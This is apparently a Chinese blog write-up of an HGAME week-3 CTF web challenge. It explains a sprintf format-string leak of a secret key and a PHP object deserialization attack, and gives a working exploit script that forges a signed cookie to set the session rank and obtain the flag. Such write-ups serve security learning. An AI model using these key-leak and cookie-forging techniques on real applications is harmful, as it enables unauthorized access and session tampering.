---
title: '【反序列化】HGAME-week3'
date: 2019-01-01
category: 'ctf那些事儿'
tags: []
lang: 'zh'
draft: true
---
这次HGAME-week3 的序列之争出的很棒，也让我进一步体会到了反序列化漏洞的原理

## 0x01 sprintf 泄露密钥

```php
    private function init($data){
        foreach($data as $key => $value){
            $this->welcomeMsg = sprintf($this->welcomeMsg, $value);
            $this->sign .= md5($this->sign . $value);
        }
    }
```
调用的时候

```php
        $data = [$playerName, $this->encryptKey];
        $this->init($data);
```
而 welcomMsg 本身只有一个 `%s`

所以我们让 `$playerName` 为 `%s` 就能做到泄露出密钥

## 0x02 反序列化

拿到 flag的条件

```php
    <?php if($game->rank->Get() === 1){?>
        <h2>hgame{flag_is_here}</h2>
    <?php }?>
```

要控制 `$game->rank->Get()` 返回值为1

由于 `$game` 的构造方法

```php
    public function __construct($playerName){
        $_SESSION['player'] = $playerName;
        if(!isset($_SESSION['exp'])){
            $_SESSION['exp'] = 0;
        }
        $data = [$playerName, $this->encryptKey];
        $this->init($data);
        $this->monster = new Monster($this->sign);
        $this->rank = new Rank();
    }
```

先看 `Rank` 类

```php
    public function __construct(){
        if(!isset($_SESSION['rank'])){
            $this->Set(rand(2, 1000));
            return;
        }

        $this->Set($_SESSION['rank']);
    }
```

构造方法会传入session中的rank值

其他的几个方法没有太大的用处

但是析构方法中

```php
    public function __destruct(){
        // 确保程序是跑在服务器上的！
        $this->serverKey = $_SERVER['key'];
        if($this->key === $this->serverKey){
            $_SESSION['rank'] = $this->rank;
        }else{
            // 非正常访问
            session_start();
            session_destroy();
            setcookie('monster', '');
            header('Location: index.php');
            exit;
        }
    }
```

只要满足 `$this->key === $this->serverKey`

就会将 `$this->rank` 的值赋值给 session中存起来，表面上看没什么，但是利用点就是在这里

最后我们看到存在反序列化的点

```php
    public function __construct($key){
        $this->encryptKey = $key;
        if(!isset($_COOKIE['monster'])){
            $this->Set();
            return;
        }

        $monsterData = base64_decode($_COOKIE['monster']);
        if(strlen($monsterData) > 32){
            $sign = substr($monsterData, -32);
            $monsterData = substr($monsterData, 0, strlen($monsterData) - 32);
            if(md5($monsterData . $this->encryptKey) === $sign){
                $this->monsterData = unserialize($monsterData);
            }else{
                session_start();
                session_destroy();
                setcookie('monster', '');
                header('Location: index.php');
                exit;
            }
        }
        
        $this->Set();     
    }
```

我们可以将 `Rank` 类序列化

然后这个类销毁的时候就会设置 session中的ran值，这样下一次实例化 Rank 类的时候，rank的值就是1了

```php
<?php
class Rank{
    private $rank = 1;
}
$data = ['e99', 'gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL'];
$sign = '';
foreach ($data as $key => $value) {
    $sign .= md5($sign.$value);
}
$rank = serialize(new Rank());
var_dump(base64_encode($rank.md5($rank.$sign)));
?>
```

> 当然这里还有一个条件需要满足 `$this->key === $this->serverKey` 这个可以用取地址来做到，但是实际测试的时候上述的exp也是可以的
